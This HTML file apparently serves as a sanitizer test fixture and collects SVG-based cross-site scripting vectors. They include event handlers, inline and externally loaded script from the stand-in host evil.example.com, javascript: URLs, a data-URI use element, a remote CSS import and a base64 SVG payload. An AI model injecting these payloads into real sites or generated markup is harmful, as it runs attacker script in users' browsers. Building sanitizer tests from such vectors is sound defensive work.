<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>XSS via SVG</title></head>
<body>
  <section>
    <h2>Inline SVG attacks</h2>
    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100" onload="alert(1)">
      <script>alert(2)</script>
      <script xlink:href="https://evil.example.com/x.js"></script>
      <a xlink:href="javascript:alert(3)"><text x="10" y="20">Click me</text></a>
      <a href="javascript:alert(4)"><circle cx="50" cy="50" r="40" fill="teal" /></a>
      <foreignObject width="100" height="100"><iframe src="javascript:alert(5)"></iframe></foreignObject>
      <animate attributeName="href" values="javascript:alert(6)" />
      <set attributeName="onmouseover" to="alert(7)" />
      <image xlink:href="javascript:alert(8)" width="10" height="10" />
      <use href="data:text/html,<script>alert(9)</script>" />
      <rect width="10" height="10" onclick="alert(10)" style="fill: url(javascript:alert(11))" />
    </svg>
    <svg><style>@import url("https://evil.example.com/x.css"); rect { fill: red; }</style><rect width="5" height="5"/></svg>
    <img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KDEyKSIvPg==" alt="svg data uri">
    <p>Text after SVG stays.</p>
  </section>
</body>
</html>
